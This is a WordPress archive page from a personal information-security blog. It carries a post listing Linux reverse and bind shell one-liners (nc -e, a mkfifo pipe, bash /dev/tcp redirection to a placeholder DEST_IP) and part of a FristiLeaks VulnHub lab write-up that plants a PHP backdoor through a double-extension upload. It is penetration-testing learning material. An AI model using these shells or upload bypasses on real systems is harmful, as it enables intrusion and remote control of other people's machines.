@@ -1,0 +1,1243 @@
+<!DOCTYPE html>
+<!--[if IE 6]>
+<html id="ie6" lang="en-US">
+<![endif]--><!--[if IE 7]>
+<html id="ie7" lang="en-US">
+<![endif]--><!--[if IE 8]>
+<html id="ie8" lang="en-US">
+<![endif]--><!--[if !(IE 6) & !(IE 7) & !(IE 8)]><!--><html lang="en-US">
+<!--<![endif]-->
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<title>
+Linux | Graeme Robinson&#039;s blog	</title>
+<link rel="profile" href="https://gmpg.org/xfn/11">
+<link rel="stylesheet" type="text/css" media="all" href="/wp-content/themes/twentyelevenmod/style.css?ver=20240716">
+<link rel="pingback" href="/xmlrpc.php">
+<!--[if lt IE 9]>
+<script src="/wp-content/themes/twentyeleven/js/html5.js?ver=3.7.0" type="text/javascript"></script>
+<![endif]-->
+<meta name="robots" content="max-image-preview:large">
+<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Feed" href="/feed/">
+<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Comments Feed" href="/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="Graeme Robinson&#039;s blog &raquo; Linux Category Feed" href="/category/unix/linux/feed/">
+<script type="text/javascript">
+/* <![CDATA[ */
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"🏳️‍⚧️","🏳️​⚧️")?!1:!n(e,"🇺🇳","🇺​🇳")&&!n(e,"🏴󠁧󠁢󠁥󠁮󠁧󠁿","🏴​󠁧​󠁢​󠁥​󠁮​󠁧​󠁿");case"emoji":return!n(e,"🐦‍⬛","🐦​⬛")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+/* ]]> */
+</script>
+<style id="wp-emoji-styles-inline-css" type="text/css">img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}</style>
+<link rel="stylesheet" id="wp-block-library-css" href="/wp-includes/css/dist/block-library/style.min.css?ver=6.6.2" type="text/css" media="all">
+<style id="wp-block-library-theme-inline-css" type="text/css">.wp-block-audio :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-audio :where(figcaption){color:#ffffffa6}.wp-block-audio{margin:0 0 1em}.wp-block-code{border:1px solid #ccc;border-radius:4px;font-family:Menlo,Consolas,monaco,monospace;padding:.8em 1em}.wp-block-embed :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-embed :where(figcaption){color:#ffffffa6}.wp-block-embed{margin:0 0 1em}.blocks-gallery-caption{color:#555;font-size:13px;text-align:center}.is-dark-theme .blocks-gallery-caption{color:#ffffffa6}:root :where(.wp-block-image figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme :root :where(.wp-block-image figcaption){color:#ffffffa6}.wp-block-image{margin:0 0 1em}.wp-block-pullquote{border-bottom:4px solid;border-top:4px solid;color:currentColor;margin-bottom:1.75em}.wp-block-pullquote cite,.wp-block-pullquote footer,.wp-block-pullquote__citation{color:currentColor;font-size:.8125em;font-style:normal;text-transform:uppercase}.wp-block-quote{border-left:.25em solid;margin:0 0 1.75em;padding-left:1em}.wp-block-quote cite,.wp-block-quote footer{color:currentColor;font-size:.8125em;font-style:normal;position:relative}.wp-block-quote.has-text-align-right{border-left:none;border-right:.25em solid;padding-left:0;padding-right:1em}.wp-block-quote.has-text-align-center{border:none;padding-left:0}.wp-block-quote.is-large,.wp-block-quote.is-style-large,.wp-block-quote.is-style-plain{border:none}.wp-block-search .wp-block-search__label{font-weight:700}.wp-block-search__button{border:1px solid #ccc;padding:.375em .625em}:where(.wp-block-group.has-background){padding:1.25em 2.375em}.wp-block-separator.has-css-opacity{opacity:.4}.wp-block-separator{border:none;border-bottom:2px solid;margin-left:auto;margin-right:auto}.wp-block-separator.has-alpha-channel-opacity{opacity:1}.wp-block-separator:not(.is-style-wide):not(.is-style-dots){width:100px}.wp-block-separator.has-background:not(.is-style-dots){border-bottom:none;height:1px}.wp-block-separator.has-background:not(.is-style-wide):not(.is-style-dots){height:2px}.wp-block-table{margin:0 0 1em}.wp-block-table td,.wp-block-table th{word-break:normal}.wp-block-table :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-table :where(figcaption){color:#ffffffa6}.wp-block-video :where(figcaption){color:#555;font-size:13px;text-align:center}.is-dark-theme .wp-block-video :where(figcaption){color:#ffffffa6}.wp-block-video{margin:0 0 1em}:root :where(.wp-block-template-part.has-background){margin-bottom:0;margin-top:0;padding:1.25em 2.375em}</style>
+<style id="classic-theme-styles-inline-css" type="text/css">/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}</style>
+<style id="global-styles-inline-css" type="text/css">:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #fff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--blue: #1982d1;--wp--preset--color--dark-gray: #373737;--wp--preset--color--medium-gray: #666;--wp--preset--color--light-gray: #e2e2e2;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}</style>
+<link rel="stylesheet" id="wp-syntax-css-css" href="/wp-content/plugins/wp-syntax/css/wp-syntax.css?ver=1.2" type="text/css" media="all">
+<link rel="stylesheet" id="twentyeleven-block-style-css" href="/wp-content/themes/twentyeleven/blocks.css?ver=20240621" type="text/css" media="all">
+<script type="text/javascript" src="/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="text/javascript" src="/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<link rel="https://api.w.org/" href="/wp-json/">
+<link rel="alternate" title="JSON" type="application/json" href="/wp-json/wp/v2/categories/39">
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="/xmlrpc.php?rsd">
+<meta name="generator" content="WordPress 6.6.2">
+	<style>/* Link color */
+		a,
+		#site-title a:focus,
+		#site-title a:hover,
+		#site-title a:active,
+		.entry-title a:hover,
+		.entry-title a:focus,
+		.entry-title a:active,
+		.widget_twentyeleven_ephemera .comments-link a:hover,
+		section.recent-posts .other-recent-posts a[rel="bookmark"]:hover,
+		section.recent-posts .other-recent-posts .comments-link a:hover,
+		.format-image footer.entry-meta a:hover,
+		#site-generator a:hover {
+			color: #ff7600;
+		}
+		section.recent-posts .other-recent-posts .comments-link a:hover {
+			border-color: #ff7600;
+		}
+		article.feature-image.small .entry-summary p a:hover,
+		.entry-header .comments-link a:hover,
+		.entry-header .comments-link a:focus,
+		.entry-header .comments-link a:active,
+		.feature-slider a.active {
+			background-color: #ff7600;
+		}</style>
+	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+<style type="text/css" id="custom-background-css">body.custom-background { background-color: #f1f1f1; }</style>
+	</head>
+
+<body class="archive category category-linux category-39 custom-background wp-embed-responsive single-author two-column right-sidebar">
+<div class="skip-link"><a class="assistive-text" href="#content">Skip to primary content</a></div>
+<div class="skip-link"><a class="assistive-text" href="#secondary">Skip to secondary content</a></div>
+<div id="page" class="hfeed">
+	<header id="branding">
+			<hgroup>
+				<h1 id="site-title"><span><a href="/" rel="home">Graeme Robinson&#039;s blog</a></span></h1>
+				<h2 id="site-description">A place for my thoughts when I was starting to break into the information security feild</h2>
+			</hgroup>
+
+						<a href="/">
+				<img src="/wp-content/uploads/2012/09/copy-Bruv-Beans-Banner.jpg" width="1000" height="228" alt="Graeme Robinson&#039;s blog" srcset="/wp-content/uploads/2012/09/copy-Bruv-Beans-Banner.jpg 1000w, /wp-content/uploads/2012/09/copy-Bruv-Beans-Banner-300x68.jpg 300w, /wp-content/uploads/2012/09/copy-Bruv-Beans-Banner-500x114.jpg 500w" sizes="(max-width: 1000px) 100vw, 1000px" decoding="async" fetchpriority="high">			</a>
+			
+									<form method="get" id="searchform" action="/">
+		<label for="s" class="assistive-text">Search</label>
+		<input type="text" class="field" name="s" id="s" placeholder="Search">
+		<input type="submit" class="submit" name="submit" id="searchsubmit" value="Search">
+	</form>
+			
+			<nav id="access">
+				<h3 class="assistive-text">Main menu</h3>
+				<div class="menu"><ul>
+<li><a href="/">Home</a></li>
+<li class="page_item page-item-2"><a href="/about-me/">About Me</a></li>
+<li class="page_item page-item-13"><a href="/infosec-links/">InfoSec Links</a></li>
+</ul></div>
+			</nav><!-- #access -->
+	</header><!-- #branding -->
+
+
+	<div id="main">
+
+		<section id="primary">
+			<div id="content" role="main">
+
+			
+				<header class="page-header">
+					<h1 class="page-title">
+					Category Archives: <span>Linux</span>					</h1>
+
+									</header>
+
+				
+				
+					
+	<article id="post-335" class="post-335 post type-post status-publish format-standard hentry category-infosec category-linux category-pentest category-shell category-unix">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/reverse-shells-even-without-nc-on-linux/" rel="bookmark">Reverse shells even without nc on Linux</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/reverse-shells-even-without-nc-on-linux/" title="1:49 PM" rel="bookmark"><time class="entry-date" datetime="2018-04-29T13:49:55+00:00">2018-04-29</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/reverse-shells-even-without-nc-on-linux/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>Often when I get remote command execution on a linux system for example I&#8217;ve planted my <a href="/single-line-php-script-to-gain-shell/">one line php script</a> , the next step is getting a remote shell. Usually an nc listener would be used to receive the reverse shell, and I normally start it with the -v option so that it will show when a connection is received.</p>
+<p>If nc or ncat is installed, it should be fairly simple to send the shell to my listener. Something like this should send a reverse shell to a nc listener, running on DEST_IP:DEST_PORT:</p>
+<pre>nc DEST_IP DEST_PORT -e /bin/bash</pre>
+<p>or I could set up a bind shell on the system then connect to it later using nc:</p>
+<pre>nc -lp 4444 -e /bin/bash</pre>
+<p>It should be noted that some versions of nc (e.g. BSD) don&#8217;t need the -p option if -l is specified (in fact it is not valid to use -p with -l on those versions), and some don&#8217;t have the -e option.</p>
+<p>It may be even better to use the -c switch instead of -e if it is available because then you can pass more than an executable name to execute. This example forwards stderr as well as stdout from bash:</p>
+<pre>nc DEST_IP DEST_PORT -c "/bin/bash 2&gt;&amp;1"</pre>
+<p>If there is no -e option, there are ways around it. One example is to use two nc listeners connected to bash, one to send commands and one to receive output:</p>
+<pre>nc DEST_IP DEST_PORT | /bin/bash 2&gt;&amp;1 | nc DEST_IP DEST_PORT+1</pre>
+<p>This is not very elegant, but it does work. We can temporarily create a named pipe and use that to connect to a single nc listener:</p>
+<pre>mkfifo /tmp/pipe;cat /tmp/pipe|nc DEST_IP DEST_PORT|/bin/bash &amp;&gt;/tmp/pipe;rm /tmp/pipe</pre>
+<p>There might also be ncat available on the system, which can be used just like nc in the first 4 examples above, and ncat provides options like &#8211;ssl which can be used to encrypt traffic and even verify identity..</p>
+<p>If no versions of netcat are installed, we can always try bash redirection. Check whether commands are running inside bash with:</p>
+<pre>$echo $0</pre>
+<p>or:</p>
+<pre>echo $SHELL</pre>
+<p>If commands are running in bash, then great, we can use bash&#8217;s tcp redirections like this:</p>
+<pre>bash &amp;&gt;/dev/tcp/DEST_IP/DEST_PORT &lt;&amp;1</pre>
+<p>This will execute bash, and forward stdout and stderr to DEST_IP:DEST_PORT and read stdin from the same. If I set up a nc listener on DEST_PORT:DEST_IP beforehand I should receive a shell.</p>
+<p>If commands are running in something like sh, which doesn&#8217;t have tcp redirection, we can check whether bash is installed with:</p>
+<pre>which bash</pre>
+<p>an if it is, just execute the commands inside bash to get redirection:</p>
+<pre>bash -c "bash &amp;&gt;/dev/tcp/DEST_IP/DEST_PORT &lt;&amp;1"</pre>
+<p>When sending these commands in a query string (e.g to a backdoor php file), watch out for url escaping the commands. If you&#8217;re typing them into the address bar, most browsers will url escape the characters, but ampersand (&#8220;&amp;&#8221;) often catches me out because it&#8217;s valid in a url as a query string delimiter, so it won&#8217;t be escaped for you.</p>
+<p>If there are no versions of netcat or bash installed, then it might be time to start investigating other using other languages (e.g. perl/python) to send the shell over tcp which is outside the scope of this post.</p>
+<p>Once you have a remote shell, executing interactive tools like sudo and passwd won&#8217;t work, but if python is installed, this one liner will make them work:</p>
+<pre>python -c "import pty;pty.spawn('/bin/bash')"</pre>
+<p>I&#8217;m sure it&#8217;s possible do similar things in other languages if python isn&#8217;t installed.</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/unix/linux/" rel="category tag">Linux</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/unix/" rel="category tag">Unix</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/reverse-shells-even-without-nc-on-linux/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-335 -->
+
+				
+					
+	<article id="post-321" class="post-321 post type-post status-publish format-standard hentry category-compromise category-infosec category-linux category-passwords category-pentest category-php category-python category-shell category-unix category-web-server">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/fristileaks-1-3/" rel="bookmark">FristiLeaks 1.3</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/fristileaks-1-3/" title="11:29 AM" rel="bookmark"><time class="entry-date" datetime="2017-10-22T11:29:27+00:00">2017-10-22</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/fristileaks-1-3/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>Following on from <a href="/kioptrix-2014/">my previous post about Kioptrix 2014</a>, this post will be about how I got root on the next VM in <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">the list</a>, which is FristiLeaks 1.3</p>
+<p>So the first thing I did after turning the VM on was notice in the console that it displays it&#8217;s IP address so there is no need to run netdiscover. So lets start with nmap:</p>
+<pre>root@kali:~# nmap -A [IP-REDACTED]
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-10-21 14:02 EDT
+Nmap scan report for [IP-REDACTED]
+Host is up (0.00035s latency).
+Not shown: 999 filtered ports
+PORT STATE SERVICE VERSION
+80/tcp open http Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+| http-methods: 
+|_ Potentially risky methods: TRACE
+| http-robots.txt: 3 disallowed entries 
+|_/cola /sisi /beer
+|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT ADDRESS
+1 0.35 ms [IP-REDACTED]
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds</pre>
+<p>Interesting results; port 80 is the only open port, and unsurprisingly it&#8217;s running a web server on that port. nmap has handily checked for a robots.txt on that system and found 3 directories listed (cola, sis, beer). Time to fire up a web browser and take a look.</p>
+<p>The index page is not that interesting, but in the source, it does suggest that I should be able to get root within four hours. It took me at least twice that! The three directories mentioned earlier all appear to server the same page with a single meme on suggesting I&#8217;m in the wrong place. Interestingly, the image is served from an &#8220;images&#8221; directory and when I go there, I am given a listing of the directory which appears to contain only this meme and the image used in the index page.</p>
+<p>At this point, I didn&#8217;t really know what I was supposed to do, but I tried going to the &#8220;fristi&#8221; directory and got lucky, because I was presented with an admin login page. If I hadn&#8217;t been so lucky, I would have used dirb, so I did this later with standard wordlists and it didn&#8217;t find anything. I then created a text file with all the words from both pages and both images and it then found the page.</p>
+<p>This admin page requires a username and password, and I don&#8217;t have either, though I could guess at passwords, and I did try things like &#8220;Nelson&#8221; (the Simpsons character in the image), but didn&#8217;t get anywhere. The source of the page has a comment from someone who calls themselves &#8220;eezeepz&#8221;. There is also a comment in the meta description that says that images are base64 encoded, and they&#8217;re right. The image of Nelson is base64 encoded, and there is also a comment below it that is base64 encoded data. That comment happens to be a base64 encoded png, the content of which is the letters &#8220;keKkeKKeKKeKkEkkEk&#8221; in comic-sans font. That looks like a password, and combined with the username &#8220;eezeepz&#8221;, I am able to log in.</p>
+<p>The page I am taken to after I log in is one where I can apparently upload a file. We know this web server runs php, so it makes sense to try to upload a php script, but when we try that it tells us that we can only upload png, jpg and gif files. I assume this is enforced by file extension rather than validating the content of the file. Most web servers will only execute files ending in .php, but a common misconfiguration is to make them execute files with .php anywhere in the name, so I called my file backdoor.php.png so I tried uploading my one line php shell with a png extension, which it appeared to accept and told me it had been placed in /uploads. Sure enough directing my web browser to http://[IP-REDACTED]/fristi/uploads/backdoor.php.png?e=whoami told me that I was able to execute commands as the user called apache.</p>
